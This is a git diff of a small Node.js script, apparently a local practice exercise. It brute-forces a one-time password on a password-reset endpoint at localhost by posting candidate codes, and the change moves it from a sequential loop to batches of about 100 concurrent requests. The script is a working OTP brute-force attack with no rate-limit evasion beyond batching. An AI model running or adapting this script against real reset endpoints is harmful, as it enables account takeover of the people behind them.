@@ -16,7 +16,7 @@ const express_1 = __importDefault(require("express"));
 const axios_1 = __importDefault(require("axios"));
 const app = (0, express_1.default)();
 app.use(express_1.default.json());
-function main(otp) {
+function sendReq(otp) {
     return __awaiter(this, void 0, void 0, function* () {
         try {
             const response = yield axios_1.default.post("http://localhost:3000/reset-password", {
@@ -31,8 +31,17 @@ function main(otp) {
         }
     });
 }
-for (let i = 800000; i < 900000; i++) {
-    //console.log(i);
-    main(i);
+//We'll do batching here.
+function main() {
+    return __awaiter(this, void 0, void 0, function* () {
+        for (let i = 127506; i < 128600; i += 100) {
+            console.log(i);
+            const p = [];
+            for (let j = 0; j <= 100; j++) {
+                p.push(sendReq((i + j).toString()));
+            }
+            yield Promise.all(p); //First let the previous 100 finish only then move forward.
+        }
+    });
 }
-main("504516");
+main();
